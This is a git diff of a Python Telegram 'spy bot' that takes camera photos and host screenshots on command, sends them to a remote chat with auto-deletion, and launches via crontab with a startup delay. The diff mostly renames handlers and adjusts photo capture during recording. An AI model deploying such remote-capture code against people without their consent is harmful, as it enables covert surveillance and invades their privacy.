@@ -4,9 +4,7 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 import logging, shutil,datetime
 from mega import Mega 
 
-
-
-
+from time import sleep
 
 
 TOKEN = os.getenv('TOKEN')
@@ -102,9 +100,9 @@ def send_welcome(message):
     bot.send_message(message.from_user.id, "Welcome to the spy bot")
 
 
-@bot.message_handler(commands=['screen2'])
+@bot.message_handler(commands=['screen'])
 def send_screen_other(message):
-    hostOther = message.text.strip('/screen2')
+    hostOther = message.text.replace('/screen', '')
     user = message.from_user.id
     if checkRequest(message):
         return
@@ -132,47 +130,46 @@ def send_screen_other(message):
     bot.delete_message(waitM.chat.id, waitM.message_id)
 
 
-@bot.message_handler(commands=['screen'])
-def send_screen(message):
-    user = message.from_user.id
-    if checkRequest(message):
-        return
+#@bot.message_handler(commands=['screen'])
+#def send_screen(message):
+    #user = message.from_user.id
+    #if checkRequest(message):
+#        #return
 
 
-    waitM = bot.send_message(user, "Wait while the bot takes the photo")
-    file = takeScreenShot()
-    if not file:
-        bot.send_message(user, "Device is busy. Can't capture photo.")
-        bot.delete_message(waitM.chat.id, waitM.message_id)
-        return
-
-
-    ranStr = getRandomString()
-
-    with open(file, 'rb') as f:
-        try:
-            photoM = bot.send_photo(user, f, caption="This photo will be deleted after 10 seconds.", 
-                reply_markup=photoMarkup(ranStr))
-        except Exception as e:
-            logger.info(e)
-    
-    photoK.queueToDelete(message, photoM, ranStr)
-    bot.delete_message(waitM.chat.id, waitM.message_id)
-
+#    waitM = bot.send_message(user, "Wait while the bot takes the photo")
+#    file = takeScreenShot()
+#    if not file:
+#        bot.send_message(user, "Device is busy. Can't capture photo.")
+#        bot.delete_message(waitM.chat.id, waitM.message_id)
+#        return
+#
+#
+#    ranStr = getRandomString()
+#
+#    with open(file, 'rb') as f:
+#        try:
+#            photoM = bot.send_photo(user, f, caption="This photo will be deleted after 10 seconds.", 
+#                reply_markup=photoMarkup(ranStr))
+#        except Exception as e:
+#            logger.info(e)
+#    
+#    photoK.queueToDelete(message, photoM, ranStr)
+#    bot.delete_message(waitM.chat.id, waitM.message_id)
+#
 
 
 @bot.message_handler(commands=['photo'])
 def send_photo(message):
-    user = message.from_user.id
-    if checkRequest(message):
-        return
+    user = message.from_user.id 
+    
+    if checkRequest(message): return
 
-    if recorder.isRunning:
-        bot.send_message(user, "Device is busy. Can't capture photo.")
-        return
 
-    waitM = bot.send_message(user, "Wait while the bot takes the photo")
-    file = recorder.takePicture()
+    waitM = bot.send_message(user, 
+            "Wait while the bot takes the photo"+("\nNote: Recording in progress" if recorder.isRunning else ''))
+    
+    file = recorder.takePhoto()
     if not file:
         bot.send_message(user, "Device is busy. Can't capture photo.")
         bot.delete_message(waitM.chat.id, waitM.message_id)
@@ -328,7 +325,10 @@ def callback_query(call):
         logger.info('Recording terminated')
 
 
-
+sleep(5)
+#^ when run with crontab, with pipenv and proxy setting
+# somehow the bot is unable to use the proxy at the start, 
+# a delay to initiate the bot seems to fix the things here.
 
 bot.send_message(ADMIN, "Starting bot")
 mega = Mega()
